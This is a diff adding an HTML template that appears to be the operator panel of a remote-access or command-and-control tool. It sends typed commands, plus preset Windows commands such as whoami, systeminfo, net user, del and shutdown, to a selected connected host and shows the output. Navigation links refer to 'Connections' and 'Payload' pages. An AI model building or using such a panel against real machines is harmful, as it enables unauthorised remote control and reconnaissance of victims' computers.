@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-size: 14px; 
+            text-align: center; 
+        }
+        #output {
+            width: 300px; 
+            height: 150px; 
+            background-color: #333; 
+            overflow: hidden; 
+            resize: none; 
+            border: 1px solid white; 
+            padding: 10px; 
+            font-size: 14px; 
+            transition: height 2s ease-in;
+            transition: height 1s ease-out;
+            text-align: center; 
+            margin: auto; 
+        }
+        #input-container {
+            text-align: center; 
+            margin-top: 50px; 
+            display: none; 
+        }
+        #input-container input[type="text"] {
+            background-color: #E6E45D;
+            height: 50px;
+            font-size: 18px; 
+            width: 300px; 
+            margin-bottom: 10px; 
+        }
+        #input-container input[type="submit"] {
+            height: 50px;
+            width: 70px;
+            font-size: 18px; 
+        }
+        .button {
+            background-color: #585D55;
+            border: none;
+            color: white;
+            padding: 5px 5px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 14px;
+            margin: 4px 2px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #E6E45D;
+        }
+        .dashboard {
+            background-color: #585D55; 
+            padding: 10px; 
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            border-bottom: 5px solid darkgrey;
+        }
+        .dashboard a {
+            color: white; 
+            text-decoration: none; 
+            margin-right: 10px; 
+        }
+        .dashboard a:hover {
+            color: #585D55; 
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <a href="http://127.0.0.1:5000/">Home</a>
+        <a href="http://127.0.0.1:5000/connections">Connections</a>
+        <a href="http://127.0.0.1:5000/payload">Payload</a>
+        <br>
+    </div>
+    <br><br>
+    <h1>Execute Commands Here:</h1> 
+    <button class="button" onclick="showInputContainer()">Input Commands</button>
+    <div id="input-container">
+        <form action="http://127.0.0.1:5000/{{name}}/execute" method="POST">
+            <p><b>Enter Command:</b></p>
+            <input type="text" name="command" size="50">
+            <br><input type="submit">
+        </form>
+    </div>
+    
+    <div id="output" oninput="resizeOutputBox()">
+        <pre><font size="-1">{{ cmd_output }}</font></pre> 
+    </div>
+    
+    <div>
+        <button class="button" onclick="sendCommand('dir')">dir</button>
+        <button class="button" onclick="sendCommand('whoami')">whoami</button>
+        <button class="button" onclick="sendCommand('systeminfo')">systeminfo</button>
+        <button class="button" onclick="sendCommand('ipconfig')">ipconfig</button>
+        <button class="button" onclick="sendCommand('net user')">net user</button>
+        <button class="button" onclick="sendCommand('tasklist')">tasklist</button>
+        <button class="button" onclick="sendCommand('mkdir')">mkdir</button>
+        <button class="button" onclick="sendCommand('del')">del</button>
+        <button class="button" onclick="sendCommand('chdir')">chdir</button>
+        <button class="button" onclick="sendCommand('shutdown')">shutdown</button>
+        <button class="button" onclick="sendCommand('quit')">quit</button>
+    </div>
+
+    <script>
+        function showInputContainer() {
+            document.getElementById('input-container').style.display = 'block';
+        }
+
+        function resizeOutputBox() {
+            var output = document.getElementById("output");
+            output.style.height = output.scrollHeight + "px";
+            output.style.width = output.scrollWidth + "px";
+        }
+
+        function sendCommand(command) {
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://127.0.0.1:5000/{{name}}/execute';
+
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'command';
+            input.value = command;
+
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+        }
+        
+        // Call the function initially
+        resizeOutputBox();
+    </script>
+</body>
+</html>
